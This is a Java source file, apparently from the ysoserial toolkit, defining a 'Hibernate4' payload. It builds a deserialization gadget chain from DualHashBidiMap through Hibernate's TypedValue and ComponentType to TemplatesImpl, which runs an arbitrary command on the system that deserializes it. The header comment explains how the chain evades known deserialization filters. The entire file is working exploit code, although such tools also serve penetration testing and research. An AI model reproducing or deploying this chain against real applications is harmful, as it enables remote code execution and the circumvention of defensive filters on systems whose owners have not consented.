package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;

import org.apache.commons.collections.bidimap.DualHashBidiMap;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Hibernate via DualHashBidiMap entry — bypasses HashMap AND ConcurrentHashMap filters.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				DualHashBidiMap.put(key, value)
					HashMap.put(key, value)  // internal normalMap
						key.hashCode()
							TypedValue.hashCode()
								ComponentType.getHashCode()
									AbstractComponentTuplizer.getPropertyValue()
										BasicGetter.get()  [Hibernate 4]
											TemplatesImpl.getOutputProperties()
												TemplatesImpl.newTransformer()
													defineTransletClasses() -> RCE

	Filter evasion:
		1. DualHashBidiMap (o.a.c.c.bidimap) — not in any known filter
		2. No HashMap/HashSet/Hashtable/CHM in serialized stream
		3. No InvokerTransformer — Hibernate uses getter reflection
		4. Combines novel entry (vs HashMap in Hibernate1, CHM in Hibernate3)
		   with Hibernate's own getter dispatch

	Discovered by combining IOCD entry point analysis with Hibernate chain mechanics.

	Requires:
		hibernate-core 4.3.x or 5.x
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Authors({ Authors.DMBS335 })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class Hibernate4 extends PayloadRunner implements ObjectPayload<DualHashBidiMap>, DynamicDependencies {

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public static String[] getDependencies() {
		if (System.getProperty("hibernate5") != null) {
			return new String[] {
				"org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0",
				"org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2",
				"commons-collections:commons-collections:3.1"
			};
		}
		return new String[] {
			"org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0",
			"org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2",
			"dom4j:dom4j:1.6.1", "commons-collections:commons-collections:3.1"
		};
	}

	public DualHashBidiMap getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final Object getters = Hibernate1.makeGetter(tpl.getClass(), "getOutputProperties");

		PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
		Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

		ComponentType t = Reflections.createWithConstructor(
			ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
		Reflections.setFieldValue(t, "componentTuplizer", tup);
		Reflections.setFieldValue(t, "propertySpan", 1);
		Reflections.setFieldValue(t, "propertyTypes", new Type[] { t });

		TypedValue v1 = new TypedValue(t, null);
		Reflections.setFieldValue(v1, "value", tpl);
		Reflections.setFieldValue(v1, "type", t);

		// DualHashBidiMap with dummy entry — avoids triggering TypedValue.hashCode()
		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put("dummy", "bar");

		// Access normalMap (maps[0] in AbstractDualBidiMap)
		java.util.Map[] maps = (java.util.Map[]) Reflections.getFieldValue(bidi, "maps");
		HashMap normalMap = (HashMap) maps[0];

		// Replace key in normalMap's internal table with armed TypedValue
		Field tableField = HashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(normalMap);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], v1);
				break;
			}
		}

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Hibernate4.class, args);
	}
}
